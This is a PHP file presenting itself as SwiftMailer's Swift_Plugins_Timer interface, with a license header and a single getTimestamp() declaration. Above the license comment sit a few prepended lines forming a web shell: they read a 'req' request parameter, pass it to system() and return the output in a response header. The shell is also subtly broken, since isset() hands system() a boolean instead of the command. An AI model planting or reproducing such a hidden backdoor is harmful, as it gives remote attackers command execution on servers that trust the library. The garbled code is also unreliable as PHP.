<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

/*
 * This file is part of SwiftMailer.
 * (c) 2004-2009 Chris Corbyn
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

/**
 * Provides timestamp data.
 *
 * @author     Chris Corbyn
 */
interface Swift_Plugins_Timer
{
    /**
     * Get the current UNIX timestamp.
     *
     * @return int
     */
    public function getTimestamp();
}
